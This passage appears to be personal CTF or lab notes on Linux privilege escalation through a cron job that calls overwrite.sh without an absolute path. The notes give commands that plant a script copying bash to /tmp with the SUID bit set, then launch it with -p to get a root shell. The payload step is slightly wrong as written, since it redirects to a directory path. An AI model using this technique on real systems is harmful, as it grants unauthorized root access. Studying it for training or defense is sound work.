#### this is a jackpot
The all asterix means that the program is running every minute. Even if dont get all asterix we can still attack through this methodology but will have to wait for that much amount of time.

The program **overwrite.sh** here doesn't have an absolute path mentioned so it will check through each of the '\$PATH' values and then execute wherever it finds overwrite.sh first

We are going to exploit this to our adv.
### NOTE: \$PATH = /firstPath:/secondPath:...
### Commands:
1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/firstPath
2. ls -al /tmp/bash and **WAIT**! (till it gets updated)
3. /tmp/bash -p
4. SHELL ACQUIRED
